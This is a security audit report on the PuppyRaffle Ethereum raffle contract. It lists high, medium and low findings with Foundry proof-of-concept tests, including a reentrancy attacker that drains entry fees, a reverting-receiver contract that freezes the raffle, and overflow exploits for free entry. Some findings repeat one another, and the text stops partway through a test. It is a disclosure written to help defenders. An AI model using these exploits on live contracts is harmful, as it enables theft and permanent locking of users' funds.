# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### PuppyRaffle Protocol
PuppyRaffle is an Ethereum-based raffle that gives participants a chance to win a dog-themed NFT while directing a configurable portion of proceeds to a fee address. 

1. **Entering**  
   • Users join by calling `enterRaffle`, sending `entranceFee` per ticket.  
   • The function prevents duplicate entries and can batch-add multiple addresses in one call.  
   • All entrants are stored in the `players` array for the current round.

2. **Refunds**  
   Players may exit before a draw via `refund(playerIndex)`, receiving their stake back and being removed from the active list.

3. **Raffle Cycle**  
   • Each round lasts `raffleDuration` seconds from `raffleStartTime`.  
   • Anyone can trigger `selectWinner` once the duration lapses. The contract pseudo-randomly selects a player, mints an NFT mapped to a rarity, and transfers the prize pool (total balance minus fee) to the winner.  
   • A fixed portion of the pot is accumulated in `totalFees` for protocol revenue.

4. **Administration**  
   • The owner can withdraw fees (`withdrawFees`) and update the fee recipient (`changeFeeAddress`).

With transparent rules, self-service refunds, and on-chain prize delivery, PuppyRaffle offers a simple, trust-minimised way to run NFT raffles.
## High Risk Findings
[H-1]. Reentrancy issue in PuppyRaffle::refund
[H-2]. Randomness issue in PuppyRaffle::selectWinner
[H-3]. Integer Overflow issue in PuppyRaffle::selectWinner
[H-4]. DOS issue in PuppyRaffle::selectWinner
[H-5]. Integer Overflow issue in PuppyRaffle::selectWinner()
[H-6]. Integer Overflow issue in PuppyRaffle::enterRaffle
[H-7]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner
[H-8]. DOS issue in PuppyRaffle::refund
[H-9]. Integer Overflow issue in PuppyRaffle::enterRaffle, selectWinner
## Medium Risk Findings
[M-1]. DOS issue in PuppyRaffle::enterRaffle
[M-2]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-3]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::refund
[M-4]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle(address[])
[M-5]. Randomness issue in PuppyRaffle::selectWinner()
[M-6]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle
[M-7]. DOS issue in PuppyRaffle::withdrawFees
[M-8]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle, selectWinner
[M-9]. DOS issue in PuppyRaffle::selectWinner
## Low Risk Findings
[L-1]. Access Control issue in PuppyRaffle::withdrawFees
[L-2]. Access Control issue in PuppyRaffle::constructor
[L-3]. Access Control issue in PuppyRaffle::changeFeeAddress
## Info Risk Findings
[I-1]. Pausable Emergency Stop issue in PuppyRaffle::NA
[I-2]. Event Consistency issue in PuppyRaffle::selectWinner(), withdrawFees()
[I-3]. Pragma issue in PuppyRaffle::NA
[I-4]. Event Consistency issue in PuppyRaffle::selectWinner
[I-5]. Event Consistency issue in PuppyRaffle::selectWinner, withdrawFees
[I-6]. Pragma issue in PuppyRaffle::NA
[I-7]. Default Visibility issue in PuppyRaffle::NA
[I-8]. DOS issue in PuppyRaffle::selectWinner


### Number of Findings
- H: 9
- M: 9
- L: 3
- I: 8



# High Risk Findings

## [H-1]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function sends ETH to the caller using `.call{value: entranceFee}` before updating the player's status by setting their address to `address(0)` in the `players` array. This violates the Checks-Effects-Interactions pattern, making the function vulnerable to a reentrancy attack. A malicious contract can implement a `receive()` or `fallback()` function that calls `refund` again, allowing it to be refunded multiple times for a single entry fee, thereby draining funds from the contract.

## Impact
An attacker can drain the contract of funds equal to the `entranceFee` multiplied by the number of successful re-entrant calls they can fit within the transaction's gas limit. This leads to direct theft of other players' entry fees.

## Proof of Concept
1. Four honest users and the attacker all enter the raffle, so the contract holds 5 * entranceFee.
2. The attacker calls refund once; inside the first call the ETH transfer to the attacker occurs before the player slot is cleared.
3. The attacker’s receive() hook re-enters refund four more times, each time passing the same stored index because the slot is still non-zero during the external call.
4. In total the attacker receives 5 * entranceFee even though only one ticket was bought, stealing other players’ funds.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle public raffle;
    uint256 public refundCount;
    uint256 private idx;

    constructor(PuppyRaffle _raffle) payable {
        raffle = _raffle;
    }

    function attack() external {
        idx = raffle.getActivePlayerIndex(address(this));
        raffle.refund(idx);
    }

    receive() external payable {
        refundCount++;
        if (refundCount < 5) {
            raffle.refund(idx);
        }
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle raffle;
    ReentrancyAttacker attacker;
    uint256 entranceFee = 0.1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, address(0xdead), 1 days);
        attacker = new ReentrancyAttacker(raffle);

        // fund and enrol 4 honest players so the contract has enough balance
        for (uint256 i = 0; i < 4; ++i) {
            address p = address(uint160(100 + i));
            vm.deal(p, entranceFee);
            address[] memory arr = new address[](1);
            arr[0] = p;
            vm.prank(p);
            raffle.enterRaffle{value: entranceFee}(arr);
        }

        // attacker enters
        vm.deal(address(attacker), entranceFee);
        address[] memory attackerArr = new address[](1);
        attackerArr[0] = address(attacker);
        vm.prank(address(attacker));
        raffle.enterRaffle{value: entranceFee}(attackerArr);
    }

    function testRefundReentrancy() public {
        uint256 balBefore = address(attacker).balance;
        uint256 contractBalBefore = address(raffle).balance;

        vm.prank(address(attacker));
        attacker.attack();

        uint256 balAfter = address(attacker).balance;
        uint256 contractBalAfter = address(raffle).balance;

        assertEq(attacker.refundCount(), 5, "got 5 refunds");
        assertEq(balAfter - balBefore, entranceFee * 5, "attacker gained 5x entrance fee");
        assertEq(contractBalBefore - contractBalAfter, entranceFee * 5, "raffle lost 5x entrance fee");
    }
}

## Suggested Mitigation
Apply the Checks-Effects-Interactions pattern by updating the state before making the external call. Set the player's address to zero *before* sending the Ether.

```diff
-    (bool success, ) = address(msg.sender).sendValue(entranceFee);
-    if (!success) {
-        revert PuppyRaffle__TransferFailed();
-    }
-    players[playerIndex] = address(0);
+    players[playerIndex] = address(0);
+    (bool success, ) = address(msg.sender).sendValue(entranceFee);
+    if (!success) {
+        revert PuppyRaffle__TransferFailed();
+    }
```

## [H-2]. Randomness issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses a combination of `msg.sender`, `block.timestamp`, and `block.difficulty` (which is `prevrandao` on post-Merge chains) to determine the winner. These sources of entropy are weak and predictable. Miners (or validators on PoS chains) can manipulate these values to influence the outcome and ensure they win the raffle. Regular users can also predict the outcome of a `selectWinner` call before broadcasting it, and choose not to proceed if they are not the winner. This fundamentally undermines the fairness and security of the raffle.

## Impact
The raffle is not fair. A malicious miner/validator can guarantee they win the prize pool and the NFT. This destroys the trust and purpose of the contract, as players have no guarantee of a fair chance.

## Proof of Concept
1. A miner participates in the raffle.
2. The raffle duration ends.
3. The miner, when creating a block, can repeatedly calculate the winner index using `keccak256(abi.encodePacked(miner_address, timestamp, difficulty))` with different potential `timestamp` values.
4. The miner can choose a `timestamp` that results in their own address being selected as the winner.
5. The miner includes the `selectWinner` transaction in the block they are mining, guaranteeing their win.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PredictableWinnerTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 0.1 ether;
    uint256 constant DURATION = 1 hours;

    address player1 = address(0x1);
    address player2 = address(0x2);
    address player3 = address(0x3);
    address player4 = address(0x4);
    address attacker = address(0xA);

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(0xdead), DURATION);

        // ensure the deployer can pay the entrance fees
        vm.deal(address(this), 10 ether);

        address[] memory players = new address[](4);
        players[0] = player1;
        players[1] = player2;
        players[2] = player3;
        players[3] = player4;

        raffle.enterRaffle{value: FEE * 4}(players);
    }

    function testAttackerCanPredictWinner() public {
        // End the raffle
        vm.warp(block.timestamp + DURATION + 1);

        // The attacker can calculate the exact winner in advance
        uint256 predictedIndex = uint256(
            keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty))
        ) % 4;

        address predictedWinner = predictedIndex == 0
            ? player1
            : predictedIndex == 1
            ? player2
            : predictedIndex == 2
            ? player3
            : player4;

        // The attacker submits the transaction only if it makes him win
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        raffle.selectWinner();

        // The previously–computed winner is indeed selected
        assertEq(raffle.previousWinner(), predictedWinner);
    }
}

## Suggested Mitigation
Use a provably random and tamper-proof source of randomness like Chainlink VRF (Verifiable Random Function). This requires a two-step process: first, request a random number from the oracle, and then, in a separate callback transaction, receive the number and select the winner. This prevents on-chain actors from predicting or influencing the outcome.

```solidity
// Example of using Chainlink VRF
// This requires significant refactoring

// 1. Request randomness
function requestRandomWinner() external returns (bytes32 requestId) {
    // ... checks ...
    requestId = VRF_COORDINATOR.requestRandomWords(...);
    // ... store requestId ...
}

// 2. Fulfill randomness in a callback
function fulfillRandomWords(bytes32 requestId, uint256[] memory randomWords) internal override {
    uint256 winnerIndex = randomWords[0] % players.length;
    address winner = players[winnerIndex];
    // ... continue with winner selection logic ...
}
```

## [H-3]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
In the `selectWinner` function, the calculated `fee` is a `uint256`, but the state variable `totalFees` is a `uint64`. The line `totalFees = totalFees + uint64(fee)` performs an unsafe cast. If the calculated `fee` exceeds the maximum value of a `uint64` (approximately 1.84e19), the value will be truncated, leading to an incorrect and much smaller value being added to `totalFees`. This overflow is plausible with a standard `entranceFee` of 1 ETH and 100 players, which would generate a fee of 20 ETH, a value far greater than `type(uint64).max`.

## Impact
Because totalFees is uint64 while fee is uint256, any round that generates a fee larger than 2**64-1 wei (≈18.4 ETH) is truncated when it is stored. The contract still keeps the full fee value, so the invariant address(this).balance == totalFees inside withdrawFees() will never hold. From the first overflowing round onward every call to withdrawFees() reverts, permanently locking all accumulated fees inside the contract.

## Proof of Concept
1. Deploy PuppyRaffle with an entranceFee of 1 ETH.
2. Call enterRaffle with 100 distinct addresses and send 100 ETH.
3. Advance time and call selectWinner(). 20 ETH stays in the contract, but only ≈1.55 ETH is recorded in totalFees.
4. address(this).balance == 20 ETH while totalFees == 1.55 ETH.
5. Any call to withdrawFees() now reverts because the equality check fails, freezing the 20 ETH forever.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract FeeOverflowLockTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant NUM_PLAYERS  = 100; // produces a 20 ETH fee
    uint256 constant DURATION     = 1 minutes;
    address feeRecipient = makeAddr("feeRecipient");

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeRecipient, DURATION);
    }

    function test_FeeOverflowLocksFunds() public {
        // generate 100 unique players
        address[] memory players = new address[](NUM_PLAYERS);
        for (uint256 i = 0; i < NUM_PLAYERS; i++) {
            players[i] = address(uint160(i + 1));
        }

        raffle.enterRaffle{value: ENTRANCE_FEE * NUM_PLAYERS}(players);

        // finish raffle
        vm.warp(block.timestamp + DURATION + 1);
        raffle.selectWinner();

        uint256 contractBal = address(raffle).balance; // ≈20 ETH
        uint256 accounted   = raffle.totalFees();       // ≈1.55 ETH
        assertGt(contractBal, accounted, "No truncation");

        vm.expectRevert();
        raffle.withdrawFees(); // must revert because balances differ
    }
}


## Suggested Mitigation
Change totalFees to uint256 (or at least uint128) and perform additions in the same type: totalFees += fee;. This removes any possibility of truncation.

## [H-4]. DOS issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function sends the prize to the winner using a low-level `.call{value: ...}()`. If the winner is a contract designed to revert upon receiving Ether, the call will fail, causing the `require(success, ...)` line to revert the entire transaction. This allows a malicious participant to perform a Denial of Service attack. If they win, the raffle is permanently halted. No winner can be chosen, no new raffle can start, and all funds (both prize pool and collected fees) become permanently locked in the contract.

## Impact
A single malicious player can permanently freeze the contract and lock all funds within it. This is a critical Denial of Service vector that renders the entire protocol unusable and leads to a total loss of locked funds.

## Proof of Concept
Deploy four different contracts whose receive() function always reverts and make them the only raffle entrants. Because the raffle requires at least four players, one of these malicious contracts will necessarily be picked as the winner. When selectWinner() attempts to pay the prize pool, the low-level call to the chosen contract fails and selectWinner() reverts, blocking the raffle forever.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract DoSAttacker {
    receive() external payable {
        revert();
    }
}

contract PuppyRaffle_DosTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(0xdead), 1);

        // Deploy 4 reverting contracts so that *every* potential winner causes a revert
        DoSAttacker a1 = new DoSAttacker();
        DoSAttacker a2 = new DoSAttacker();
        DoSAttacker a3 = new DoSAttacker();
        DoSAttacker a4 = new DoSAttacker();

        address[] memory entrants = new address[](4);
        entrants[0] = address(a1);
        entrants[1] = address(a2);
        entrants[2] = address(a3);
        entrants[3] = address(a4);

        vm.deal(address(this), 4 ether);
        raffle.enterRaffle{value: 4 ether}(entrants);
    }

    function testRevertsWhenMaliciousWinner() public {
        // Fast-forward so raffle period has ended
        vm.warp(block.timestamp + 2);

        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        raffle.selectWinner();
    }
}

## Suggested Mitigation
Do not use a push-based payment system where the contract is responsible for sending funds. Implement a pull-based payment system. The winner should be responsible for calling a `claimPrize` function to withdraw their funds. This shifts the responsibility for gas and execution success to the winner, preventing them from causing a revert in the core contract logic.

```diff
+   mapping(address => uint256) public pendingReturns;

function selectWinner() external {
    // ... (logic to determine winner)
    address winner = players[winnerIndex];
    uint256 prizePool = ...;

-   (bool success, ) = winner.call{value: prizePool}();
-   require(success, "PuppyRaffle: Failed to send prize pool to winner");
+   pendingReturns[winner] += prizePool;

    // ... (rest of the logic)
}

+ function claimPrize() external {
+    uint256 amount = pendingReturns[msg.sender];
+    require(amount > 0, "No prize to claim");
+
+    pendingReturns[msg.sender] = 0;
+
+    (bool success, ) = msg.sender.call{value: amount}();
+    require(success, "Transfer failed");
+ }
```

## [H-5]. Integer Overflow issue in PuppyRaffle::selectWinner()

## Description
In the `selectWinner` function, the `fee` is calculated as a `uint256` but is then downcast to a `uint64` before being added to the `totalFees` state variable. `totalFees` itself is a `uint64`. If the collected `fee` for a single raffle exceeds the maximum value of a `uint64` (approximately 18.4 ETH), the value will silently overflow. This causes the `totalFees` counter to store an incorrect, much smaller value, leading to a loss of funds for the `feeAddress`.

## Impact
When `fee` is larger than `type(uint64).max` the truncation makes `totalFees` much smaller than the real ETH held by the contract. Because `withdrawFees()` contains `require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!")` the call will ALWAYS revert (`balance > totalFees`). As a result the entire fee pot becomes permanently locked inside the contract and can never be withdrawn by the protocol owner. Over time this can accumulate to an unbounded amount of ETH, causing a direct financial loss and denial-of-revenue to the project.

## Proof of Concept
1. Deploy contract with `entranceFee = 100 ether`, `raffleDuration = 1`, any `feeAddress`.
2. Call `enterRaffle` with an array of 4 distinct addresses and send 400 ETH.
3. Wait > raffleDuration and invoke `selectWinner`.
   •  Total fee = 80 ETH > 18.4 ETH ⇒ truncated to ~6.22 ETH in `totalFees`.
4. Call `withdrawFees()` – it reverts with "PuppyRaffle: There are currently players active!" even though the raffle is finished.
5. The 80 ETH remains stuck in the contract forever.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract FeeOverflowLocksFunds is Test {
    PuppyRaffle raffle;
    address feeAddr = address(0xFEE);

    function setUp() public {
        raffle = new PuppyRaffle(100 ether, feeAddr, 1);
    }

    function testFeeOverflowLocksEth() public {
        // --- prepare participants ---
        address[] memory p = new address[](4);
        p[0] = address(0x1);
        p[1] = address(0x2);
        p[2] = address(0x3);
        p[3] = address(0x4);

        // Enter four players paying 400 ETH in total
        raffle.enterRaffle{value: 400 ether}(p);

        // Finish raffle and pick winner
        vm.warp(block.timestamp + 2);
        raffle.selectWinner();

        // Sanity-check that only ~6.22 ETH was stored instead of 80 ETH
        uint256 stored = uint256(raffle.totalFees());
        assertLt(stored, 10 ether, "truncation did not happen");

        // Fee withdrawal must revert because balance != totalFees
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Replace the `totalFees` type with `uint256` (or use OpenZeppelin's SafeCast to validate the down-cast) and eliminate the explicit cast in `selectWinner`. This removes the possibility of truncation and ensures `withdrawFees` can succeed for any fee size.

## [H-6]. Integer Overflow issue in PuppyRaffle::enterRaffle

## Description
In `enterRaffle`, the amount required to be sent with the transaction is calculated as `entranceFee * newPlayers.length`. The contract is using Solidity version 0.7.6, which does not have built-in protection against integer overflows. An attacker can provide a combination of a large `entranceFee` (set at deployment) and a crafted `newPlayers.length` to make the multiplication overflow. If the result of the overflow is 0, the attacker can make multiple entries for free.

## Impact
This vulnerability allows an attacker to enter the raffle with multiple addresses without paying the required fee. This dilutes the chances of legitimate, paying participants and allows the attacker to have a significant, unfair advantage in winning the prize pool, effectively enabling theft of the prize.

## Proof of Concept
1. The owner deploys the contract with a very large `entranceFee`, for example, `2**250`.
2. An attacker crafts a call to `enterRaffle` with an array of `128` new player addresses.
3. The required value calculation becomes `2**250 * 128 = 2**250 * 2**7 = 2**257`.
4. Since this value is larger than `uint256.max`, it overflows and wraps around to `0`.
5. The attacker calls `enterRaffle` with `msg.value = 0`.
6. The `require` check `msg.value == 0` passes, and the attacker successfully enters 128 players into the raffle for free.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract IntegerOverflowEntryTest is Test {
    PuppyRaffle raffle;
    uint256 constant LARGE_ENTRANCE_FEE = 2**250; // very large fee that will overflow when multiplied by 128
    address constant FEE_ADDRESS = address(0x1);

    function setUp() public {
        raffle = new PuppyRaffle(LARGE_ENTRANCE_FEE, FEE_ADDRESS, 60);
    }

    function test_OverflowAllowsFreeEntries() public {
        uint256 numPlayers = 128; // chosen so fee * length == 2**256 == 0 (mod 2**256)
        address[] memory newPlayers = new address[](numPlayers);

        // craft 128 unique player addresses
        for (uint256 i = 0; i < numPlayers; i++) {
            newPlayers[i] = address(uint160(i + 1));
        }

        // prank a random caller and enter with zero ether
        vm.prank(address(0xDEAD));
        raffle.enterRaffle{value: 0}(newPlayers);

        // spot-check that some of the players were actually registered
        uint256 idx0 = raffle.getActivePlayerIndex(newPlayers[0]);
        uint256 idx10 = raffle.getActivePlayerIndex(newPlayers[10]);
        assertEq(idx0, 0, "Player 0 not registered");
        assertEq(idx10, 10, "Player 10 not registered");

        // contract received no ether
        assertEq(address(raffle).balance, 0, "Contract balance should be zero after free entries");
    }
}

## Suggested Mitigation
Use a safe math library to perform arithmetic operations, or upgrade the contract to Solidity version 0.8.0 or higher, which has built-in overflow and underflow checks.

Using OpenZeppelin's `SafeMath` library:
```diff
+ import "@openzeppelin/contracts/math/SafeMath.sol";

contract PuppyRaffle is ERC721, Ownable {
+   using SafeMath for uint256;

    function enterRaffle(address[] memory newPlayers) public payable {
+       uint256 requiredValue = entranceFee.mul(newPlayers.length);
        require(
-           msg.value == entranceFee * newPlayers.length,
+           msg.value == requiredValue,
            "PuppyRaffle: Must send enough to enter raffle"
        );
        // ...
    }
}
```

## [H-7]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner

## Description
The winner selection and NFT rarity determination in `selectWinner` depend on weak sources of randomness: `block.timestamp`, `block.difficulty`, and `msg.sender`. These values are public and can be predicted or influenced by blockchain miners. A miner who is also a participant in the raffle can selectively mine a block only when the hash of these predictable values results in them being chosen as the winner. This compromises the fairness and integrity of the raffle.

## Impact
The predictability of the winner selection process allows for cheating. A malicious miner can gain a significant advantage, potentially guaranteeing that they win the raffle. This undermines the trust in the protocol and devalues the participation for all other users, as the raffle is no longer fair.

## Proof of Concept
1. An attacker (who is a miner) participates in the raffle.
2. After the raffle period ends, the attacker can call `selectWinner`.
3. Before including the transaction in a block they are mining, they can calculate the outcome of the random number generation using the block's proposed timestamp and their own address as `msg.sender`.
4. If the calculation shows they will win, they include the transaction and solve the block.
5. If the calculation shows another player will win, they discard the transaction and try again with a different timestamp in the next block they attempt to mine.
6. This gives the miner the ability to re-roll the dice until they get a favorable outcome.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract WeakRandomnessTest is Test {
    PuppyRaffle private raffle;

    uint256 constant ENTRANCE_FEE = 1 ether;
    address constant FEE_ADDRESS = address(0x1);
    uint256 constant RAFFLE_DURATION = 60;

    address player1 = address(0x100);
    address player2 = address(0x200);
    address player3 = address(0x300);
    address player4 = address(0x400);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, RAFFLE_DURATION);

        // Fund the test contract so it can pay the entrance fees
        vm.deal(address(this), ENTRANCE_FEE * 4);

        address[] memory entrants = new address[](4);
        entrants[0] = player1;
        entrants[1] = player2;
        entrants[2] = player3;
        entrants[3] = player4;

        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(entrants);
    }

    function testPredictableWinner() public {
        // Fast-forward past raffle duration
        vm.warp(block.timestamp + RAFFLE_DURATION + 1);

        // Pre-compute the winner exactly the same way the contract does
        uint256 idx = uint256(
            keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))
        ) % 4;

        address expected = idx == 0 ? player1 : idx == 1 ? player2 : idx == 2 ? player3 : player4;

        raffle.selectWinner();

        assertEq(raffle.previousWinner(), expected, "winner is predictable");
    }
}

## Suggested Mitigation
Do not use on-chain data like `block.timestamp` or `block.difficulty` for randomness. Use a provably fair and tamper-proof source of randomness, such as Chainlink VRF (Verifiable Random Function). This involves a two-step request/receive pattern where a random number is requested from an oracle and securely delivered back to the contract in a separate transaction, making it impossible for miners or users to predict or influence the outcome.

## [H-8]. DOS issue in PuppyRaffle::refund

## Description
The `refund` function removes a player by setting their address in the `players` array to `address(0)`. It does not shrink the array or shift elements to fill the gap. Over time, if many players enter and then get refunds, the `players` array can become very large and sparse (mostly filled with `address(0)`). Functions that iterate over this array, such as the duplicate check in `enterRaffle` and the winner selection logic, will consume progressively more gas, leading to higher transaction costs for users and potential denial of service if the gas cost exceeds the block limit.

## Impact
Because refunded players are still counted in players.length, totalAmountCollected is calculated with an inflated number. After enough players are refunded the contract balance becomes lower than prizePool, causing the low-level ETH transfer in selectWinner to revert and the whole raffle to be permanently stuck. All ETH belonging to the remaining players is therefore locked and neither a winner can be chosen nor fees withdrawn. This is a permanent Denial-of-Service with loss of funds for honest users.

## Proof of Concept
1. 4 players enter the raffle with a 1 ETH entrance fee (total 4 ETH).
2. 3 of them call refund() – contract balance is now 1 ETH but players.length is still 4.
3. Time passes so that raffleDuration is over.
4. Any call to selectWinner computes totalAmountCollected = 4 ETH, prizePool = 3.2 ETH and fee = 0.8 ETH.
5. The contract tries to send 3.2 ETH while holding only 1 ETH, the call fails and selectWinner reverts with “PuppyRaffle: Failed to send prize pool to winner”.
6. Raffle can never be finished and all remaining funds are locked.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RefundDoSTest is Test {
    PuppyRaffle raffle;
    uint256 entranceFee = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, address(0xdead), 600);
    }

    function test_selectWinnerRevertsAfterRefunds() public {
        // prepare 4 players
        address[4] memory players = [address(1), address(2), address(3), address(4)];
        for (uint256 i = 0; i < 4; i++) vm.deal(players[i], 10 ether);

        // anyone can add them – send 4 ETH
        address[] memory batch = new address[](4);
        for (uint256 i = 0; i < 4; i++) batch[i] = players[i];
        raffle.enterRaffle{value: 4 ether}(batch);

        // three players refund
        for (uint256 i = 0; i < 3; i++) {
            vm.prank(players[i]);
            raffle.refund(i); // indices 0,1,2
        }

        // move time forward so raffle is over
        vm.warp(block.timestamp + 601);

        // selectWinner must revert because contract only has 1 ETH but tries to pay 3.2 ETH
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();
    }
}

## Suggested Mitigation
Keep the players array compact or track an explicit activePlayerCount. The simplest fix is to replace a refunded slot by the last element and pop() the array, then recompute indices via a mapping (address => uint256) to support future refunds. Additionally, calculate totalAmountCollected using the number of active players rather than players.length so prizePool never exceeds the contract balance.

## [H-9]. Integer Overflow issue in PuppyRaffle::enterRaffle, selectWinner

## Description
The contract is compiled with Solidity `0.7.6`, which does not provide default protection against integer overflow and underflow. Multiple arithmetic operations are performed without using a safe math library, creating vulnerabilities.
1. `enterRaffle`: `entranceFee * newPlayers.length` can overflow. If an attacker chooses `entranceFee` and `newPlayers.length` such that their product wraps around, they can enter the raffle for a negligible amount of ETH, violating the payment requirement.
2. `selectWinner`: `players.length * entranceFee` can similarly overflow, leading to a much smaller `totalAmountCollected` than expected. This results in a smaller prize for the winner and a smaller fee for the protocol, with the remaining funds being locked in the contract.
3. `selectWinner`: `totalFees` is a `uint64` and is incremented by `fee`, a `uint256`. The explicit cast `uint64(fee)` can truncate a large fee value, leading to an overflow of `totalFees` and incorrect fee accounting.

## Impact
These vulnerabilities can lead to direct financial loss. Attackers can bypass the payment mechanism. The prize pool and fee calculations can be manipulated, resulting in funds being permanently locked in the contract and incorrect fee accounting, which could be exploited in various ways.

## Proof of Concept
1. Deploy PuppyRaffle with `entranceFee = 2**255` (i.e. `0x8000...000`).
2. Because Solidity 0.7.x does not revert on overflow, the multiplication `entranceFee * 2` in `enterRaffle` wraps to `0`.
3. The attacker crafts a 2-element array `[attacker1, attacker2]` and calls `enterRaffle` sending **0 wei**.
4. The `require(msg.value == entranceFee * 2)` passes (`0 == 0`) so both addresses enter the raffle for free.
5. The two free tickets give the attackers the same chance of winning the whole prize pool as honest users who paid the full fee, allowing them to extract value from the pool without spending ETH.

Any `(entranceFee, count)` pair whose product crosses `2**256` will work; choosing `entranceFee = 2**255` and `count = 2` is the simplest.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract IntegerOverflowTest is Test {
    address constant FEE_ADDRESS = address(1);
    uint256 constant RAFFLE_DURATION = 1 days;

    function test_enterRaffleOverflow() public {
        // entranceFee = 2^255 so that entranceFee * 2 wraps to 0
        uint256 highEntranceFee = 1 << 255;
        PuppyRaffle raffle = new PuppyRaffle(highEntranceFee, FEE_ADDRESS, RAFFLE_DURATION);

        address attacker1 = address(0xBEEF);
        address attacker2 = address(0xCAFE);

        address[] memory newPlayers = new address[](2);
        newPlayers[0] = attacker1;
        newPlayers[1] = attacker2;

        vm.prank(attacker1);
        raffle.enterRaffle{value: 0}(newPlayers); // succeeds with 0 wei sent

        assertEq(raffle.players(0), attacker1);
        assertEq(raffle.players(1), attacker2);
        assertEq(address(raffle).balance, 0); // contract received no ETH
    }
}

## Suggested Mitigation
The best mitigation is to upgrade the Solidity compiler version to `0.8.0` or higher. Versions `0.8.x` have built-in overflow and underflow checks that will cause a transaction to revert if an arithmetic operation wraps around. If upgrading is not possible, use OpenZeppelin's `SafeMath` library for all arithmetic operations.

Example with `SafeMath`:
```solidity
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract PuppyRaffle is ERC721, Ownable {
    using SafeMath for uint256;

    // In enterRaffle
    uint256 totalValue = entranceFee.mul(newPlayers.length);
    require(msg.value == totalValue, "...");

    // In selectWinner
    uint256 totalAmountCollected = uint256(players.length).mul(entranceFee);
    // ...
}
```



# Medium Risk Findings

## [M-1]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function iterates through all existing players in a nested loop to check for duplicates (`for (uint256 i = 0; i < players.length - 1; i++) { for (uint256 j = i + 1; j < players.length; j++) ... }`). This has a computational complexity of O(n^2), where n is the number of players. As the `players` array grows, the gas cost of this function increases quadratically. An attacker can add a large number of players (in batches, if needed) to make subsequent calls to `enterRaffle` so expensive that they exceed the block gas limit, effectively causing a Denial of Service and preventing anyone else from entering the raffle.

## Impact
Because the duplicate-detection algorithm inside enterRaffle is O(n²), the gas cost of every subsequent entry grows quadratically with the total number of players. An attacker can pre-fill the raffle with hundreds of addresses so that the next enterRaffle call requires more gas than a normal user is willing (or able) to supply in a single transaction. While the raffle can eventually be completed by calling selectWinner, new users are effectively prevented from entering for the remainder of the round, suppressing participation and revenue.

## Proof of Concept
1. The attacker repeatedly calls enterRaffle with moderately sized batches (e.g. 60 addresses at a time).  
2. Each call succeeds because the attacker provides enough gas. After 10 batches there are 600 entries.  
3. Gas for the nested duplicate-check is now ~600² ≈ 360 000 iterations.  
4. A honest user calls enterRaffle with the default 1 000 000 gas stipend supplied by most front-ends (Metamask, Ethers.js). The transaction runs out of gas and is discarded.  
5. Until the owner (or somebody) calls selectWinner and clears the players array, no one can join the raffle unless they manually raise the gas limit to an unusually high value.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract DosGasTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1e16;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(0xdead), 1 days);
    }

    function _fill(uint256 batchSize, uint256 batches) internal {
        for (uint256 b; b < batches; ++b) {
            address[] memory addrs = new address[](batchSize);
            for (uint256 i; i < batchSize; ++i) {
